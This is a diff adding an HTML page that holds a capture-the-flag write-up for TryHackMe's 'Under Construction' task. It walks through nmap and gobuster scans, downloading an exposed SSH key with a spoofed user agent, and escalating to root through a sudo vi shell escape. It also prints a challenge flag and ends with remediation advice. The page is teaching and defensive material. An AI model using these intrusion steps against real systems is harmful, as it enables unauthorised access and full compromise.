@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><link rel="canonical" href="https://hello-robbie.github.io/industrial-intrusion-tryhackme/Task%2016%20-%20Under%20Construction/" />
+      <link rel="shortcut icon" href="../../img/favicon.ico" />
+    <title>Task 16 - Under Construction - Hello Robbie</title>
+    <link rel="stylesheet" href="../../css/theme.css" />
+    <link rel="stylesheet" href="../../css/theme_extra.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css" />
+    
+      <script>
+        // Current page data
+        var mkdocs_page_name = "Task 16 - Under Construction";
+        var mkdocs_page_input_path = "industrial-intrusion-tryhackme/Task 16 - Under Construction.md";
+        var mkdocs_page_url = "/industrial-intrusion-tryhackme/Task%2016%20-%20Under%20Construction/";
+      </script>
+    
+    <!--[if lt IE 9]>
+      <script src="../../js/html5shiv.min.js"></script>
+    <![endif]-->
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+      <script>hljs.highlightAll();</script> 
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+          <a href="../.." class="icon icon-home"> Hello Robbie
+        </a><div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../..">Home</a>
+                </li>
+              </ul>
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../../resume/">Resume</a>
+                </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Blog</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../blog/honeypots/">Why I Use Honeypots</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../blog/webpaths/">Web App Default Paths</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Industrial Intrusion - TryHackMe CTF</span></p>
+              <ul class="current">
+                  <li class="toctree-l1"><a class="reference internal" href="../Intro/">Intro</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%206%20-%20OSINT2/">Task 6 - OSINT2</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%208%20-%20Kaboom/">Task 8 - Kaboom</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%209%20-%20Brr%20v2/">Task 9 - Brr v2</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2010%20-%20Brr%20v1/">Task 10 - Brr v1</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2012%20-%20Poison/">Task 12 - Poison</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2013%20-%20Orcam/">Task 13 - Orcam</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2014%20-%20Backdoored%20Bus/">Task 14 - Backdoored Bus</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2015%20-%20Chess%20Industry/">Task 15 - Chess Industry</a>
+                  </li>
+                  <li class="toctree-l1 current"><a class="reference internal current" href="#">Task 16 - Under Construction</a>
+    <ul class="current">
+    <li class="toctree-l2"><a class="reference internal" href="#executive-summary">Executive Summary</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#phase-1-reconnaissance-and-entry">Phase 1: Reconnaissance and Entry</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#11-port-scan-and-service-discovery">1.1 Port Scan and Service Discovery</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#12-web-enumeration-and-key-discovery">1.2 Web Enumeration and Key Discovery</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#phase-2-gaining-shell-access">Phase 2: Gaining Shell Access</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#phase-3-privilege-escalation">Phase 3: Privilege Escalation</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#31-sudo-misconfiguration">3.1 Sudo Misconfiguration</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#32-root-shell-via-vi">3.2 Root Shell via Vi</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#33-flag-exfiltration">3.3 Flag Exfiltration</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#summary-and-recommendations">Summary and Recommendations</a>
+    </li>
+    </ul>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2017%20-%20Klay/">Task 17 - Klay</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2022%20-%20Rogue%20Poller/">Task 22 - Rogue Poller</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2024%20-%20Auth/">Task 24 - Auth</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2025%20-%20Access%20Granted/">Task 25 - Access Granted</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2028%20-%20Start/">Task 28 - Start</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2029%20-%20Industrial/">Task 29 - Industrial</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2033%20-%20IndustrialChain/">Task 33 - Industrial Chain</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2035%20-%20Uninterrupted%20Problem%20Supply/">Task 35 - Uninterrupted Problem Supply</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2036%20-%20Mechacore%20Monitoring%20System/">Task 36 - Mechacore Monitoring System</a>
+                  </li>
+              </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../..">Hello Robbie</a>
+        
+      </nav>
+      <div class="wy-nav-content">
+        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="../.." class="icon icon-home" aria-label="Docs"></a></li>
+          <li class="breadcrumb-item">Industrial Intrusion - TryHackMe CTF</li>
+      <li class="breadcrumb-item active">Task 16 - Under Construction</li>
+    <li class="wy-breadcrumbs-aside">
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+            <div class="section" itemprop="articleBody">
+              
+                <h1 id="ics-security-assessment-task-16-under-construction">ICS Security Assessment – Task 16: Under Construction</h1>
+<h2 id="executive-summary">Executive Summary</h2>
+<p>The target system was compromised by conducting web directory enumeration, retrieving an exposed SSH private key, and using it to gain access to the development user account. From there, privilege escalation was achieved via misconfigured <code>sudo</code> permissions allowing the <code>vi</code> editor to be run as root. Using <code>vi</code>, a root shell was spawned, and the final flag was exfiltrated.</p>
+<hr />
+<h2 id="phase-1-reconnaissance-and-entry">Phase 1: Reconnaissance and Entry</h2>
+<p>A thorough scan of open ports and exposed web content revealed potential footholds.</p>
+<h3 id="11-port-scan-and-service-discovery">1.1 Port Scan and Service Discovery</h3>
+<pre><code class="language-bash">nmap -p- -T4 10.10.57.150
+nmap -sC -sV -p 22,80 10.10.57.150
+</code></pre>
+<p>Open services:</p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Version</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22</td>
+<td>SSH</td>
+<td>OpenSSH 9.6p1 (Ubuntu)</td>
+</tr>
+<tr>
+<td>80</td>
+<td>HTTP</td>
+<td>Apache 2.4.58 (Ubuntu)</td>
+</tr>
+</tbody>
+</table>
+<h3 id="12-web-enumeration-and-key-discovery">1.2 Web Enumeration and Key Discovery</h3>
+<p>A Gobuster scan revealed the presence of multiple <code>.php</code> files and a <code>/keys/</code> directory.</p>
+<pre><code class="language-bash">gobuster dir -u http://10.10.57.150/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
+</code></pre>
+<p>Attempting direct downloads of <code>id_rsa</code> via <code>wget</code> failed. However, spoofing a browser User-Agent allowed the download:</p>
+<pre><code class="language-bash">curl -A &quot;Mozilla/5.0&quot; http://10.10.57.150/keys/id_rsa -o id_rsa
+chmod 600 id_rsa
+</code></pre>
+<hr />
+<h2 id="phase-2-gaining-shell-access">Phase 2: Gaining Shell Access</h2>
+<p>With the private key in hand, SSH access was attempted using common usernames. The login succeeded using the username <code>dev</code>.</p>
+<pre><code class="language-bash">ssh -i id_rsa dev@10.10.250.236
+</code></pre>
+<p>Upon successful login, the first flag was retrieved from the home directory.</p>
+<pre><code class="language-bash">cat ~/user.txt
+</code></pre>
+<p>Flag: <code>THM{nic3_j0b_You_got_it_w00tw00t}</code></p>
+<hr />
+<h2 id="phase-3-privilege-escalation">Phase 3: Privilege Escalation</h2>
+<h3 id="31-sudo-misconfiguration">3.1 Sudo Misconfiguration</h3>
+<p>The following output from <code>sudo -l</code> revealed the path to root:</p>
+<pre><code class="language-bash">User dev may run the following commands on tryhackme-2404:
+    (ALL) NOPASSWD: /usr/bin/vi
+</code></pre>
+<h3 id="32-root-shell-via-vi">3.2 Root Shell via Vi</h3>
+<p>Running <code>vi</code> with <code>sudo</code> privileges and escaping to a shell:</p>
+<pre><code class="language-bash">sudo /usr/bin/vi
+</code></pre>
+<p>Inside vi:</p>
+<pre><code>:set shell=/bin/bash
+:shell
+</code></pre>
+<p>This spawned a root shell. Root access was confirmed via:</p>
+<pre><code class="language-bash">whoami
+</code></pre>
+<h3 id="33-flag-exfiltration">3.3 Flag Exfiltration</h3>
+<pre><code class="language-bash">cat /root/root.txt
+</code></pre>
+<p>Root flag successfully retrieved.</p>
+<hr />
+<h2 id="summary-and-recommendations">Summary and Recommendations</h2>
+<p>This scenario illustrates common misconfigurations that can lead to full system compromise:</p>
+<ul>
+<li><strong>Exposure of sensitive keys via unprotected web directories</strong></li>
+<li><strong>Improper sudo permissions granting root access through vi</strong></li>
+<li><strong>Lack of username obfuscation or access control</strong></li>
+</ul>
+<p><strong>Recommendations:</strong></p>
+<ul>
+<li>Disable directory listing on web servers</li>
+<li>Restrict <code>sudo</code> permissions to non-interactive scripts or limited binaries</li>
+<li>Monitor file access in <code>/keys</code> and similar sensitive directories</li>
+<li>Rotate SSH keys regularly and implement strict user-role segmentation</li>
+</ul>
+              
+            </div>
+          </div><footer>
+    <div class="rst-footer-buttons" role="navigation" aria-label="Footer Navigation">
+        <a href="../Task%2015%20-%20Chess%20Industry/" class="btn btn-neutral float-left" title="Task 15 - Chess Industry"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+        <a href="../Task%2017%20-%20Klay/" class="btn btn-neutral float-right" title="Task 17 - Klay">Next <span class="icon icon-circle-arrow-right"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+          
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="Versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+      <span><a href="../Task%2015%20-%20Chess%20Industry/" style="color: #fcfcfc">&laquo; Previous</a></span>
+    
+    
+      <span><a href="../Task%2017%20-%20Klay/" style="color: #fcfcfc">Next &raquo;</a></span>
+    
+  </span>
+</div>
+    <script src="../../js/jquery-3.6.0.min.js"></script>
+    <script>var base_url = "../..";</script>
+    <script src="../../js/theme_extra.js"></script>
+    <script src="../../js/theme.js"></script>
+      <script src="../../search/main.js"></script>
+    <script>
+        jQuery(function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        });
+    </script>
+
+</body>
+</html>
